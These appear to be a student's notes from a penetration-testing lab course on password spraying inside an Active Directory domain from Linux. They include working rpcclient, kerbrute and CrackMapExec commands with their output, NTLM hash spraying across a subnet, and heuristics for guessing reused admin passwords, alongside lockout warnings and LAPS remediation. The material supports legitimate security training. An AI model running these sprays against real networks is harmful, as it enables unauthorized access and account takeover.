# Internal Password Spraying - from Linux
---

## rpcclient — Bash One-Liner Spray

`rpcclient` doesn't make a successful login obvious by default — a valid login is confirmed by the response containing **`Authority Name`**. Filter for that string to surface hits only.

The following Bash one-liner (adapted from [here](https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/)) can be used to perform the attack.

```shellsession
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

| **Part**                          | **Meaning**                                                                                                                                          |
| --------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| `for u in $(cat valid_users.txt)` | Loops through every username in the `valid_users.txt` file.                                                                                          |
| `rpcclient -U "$u%Welcome1"`      | Attempts to authenticate to the target using the username `$u` and the password `Welcome1` (`user%password` is `rpcclient`'s authentication syntax). |
| `-c "getusername;quit"`           | After logging in, runs the `getusername` command to verify the login, then exits `rpcclient`.                                                        |
| `172.16.5.5`                      | IP address of the target Domain Controller.                                                                                                          |
| `\| grep Authority`               | Filters the output to show only successful logins (lines containing **Authority**), hiding failed attempts.                                          |
### Result

```shellsession
s0nam@htb[/htb]$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

Two valid hits for password `Welcome1`: `tjohnson` and `sgage`.

Same tool used for user enumeration, different subcommand.

`passwordspray -d <domain> --dc <ip> <userlist> <password>` — tests every user in the list against the one password via Kerberos

## CrackMapExec — Spray + Filter

CrackMapExec accepts a username file sprayed against a single password. Filter with `grep +` to isolate successful logins (CME prefixes valid hits with `[+]`).

```shellsession
s0nam@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

### Validate a Hit

Once you have a candidate credential, re-run CME against just that account to confirm:

```shellsession
s0nam@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

## Local Administrator Password Reuse

Password spraying isn't limited to domain accounts — it also applies to **local admin accounts** across multiple hosts.

> [!info] Why this works so often
> Widespread due to **gold images** in automated deployments, and admins enforcing the same local admin password across many hosts "for ease of management."

**Where to focus:** high-value hosts (SQL, Exchange servers) — more likely to have a privileged user logged in, or credentials cached in memory.

### Password Pattern Reuse Heuristics

| Observation                                         | What to try next                                                                |
| --------------------------------------------------- | ------------------------------------------------------------------------------- |
| Desktop local admin password = `$desktop%@admin123` | Try `$server%@admin123` against servers                                         |
| Non-standard local admin account, e.g. `bsmith`     | Check if the password is reused on a similarly-named **domain** account         |
| Domain user `ajones`'s password known               | Try the same password on their admin-suffixed account, e.g. `ajones_adm`        |
| Valid creds for a user in Domain A                  | Try the same/similar username + password in a trusted Domain B (and vice versa) |

### Spraying an NTLM Hash Across a Subnet

Sometimes only the **NTLM hash** for a local admin account is recovered (e.g. from a local SAM database) — that hash can be sprayed across a whole subnet to find other hosts sharing the same local admin password.

```shellsession
s0nam@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

> [!danger] `--local-auth` is mandatory here
> This flag makes CME attempt login **only once per machine**, removing lockout risk. Without it, CME authenticates against the current **domain** by default — which could rapidly lock out the built-in domain administrator account across many hosts. Always set `--local-auth` when spraying local admin credentials across a subnet.

**Result:** the same NT hash is valid as local admin on 3 hosts (`ACADEMY-EA-MX01`, `ACADEMY-EA-MS01`, `ACADEMY-EA-WEB0`) — worth enumerating each further for additional access.

> [!warning] Noisy technique
> Effective, but loud — not suitable for engagements requiring stealth. Still worth checking for even outside your main compromise path, since it's a common finding worth flagging to the client regardless.

**Remediation:** [Microsoft LAPS](https://www.microsoft.com/en-us/download/details.aspx?id=46899) (Local Administrator Password Solution) — has AD manage and rotate a unique local admin password per host on a set interval.

## Key Takeaways

- [ ] `rpcclient` spray: filter for `Authority Name` in the output to spot valid logins
- [ ] `kerbrute passwordspray -d <domain> --dc <ip> <userlist> <password>` — Kerberos-based, stealthy (no Event ID 4625)
- [ ] `crackmapexec smb <dc> -u <userlist> -p <password> | grep +` — filter valid hits with `+`
- [ ] Local admin password reuse is common due to gold images — check pattern variations across similar hostnames/usernames
- [ ] Spraying an NTLM hash across a subnet: **always use `--local-auth`** to avoid domain lockouts
- [ ] LAPS is the standard remediation for local admin password reuse
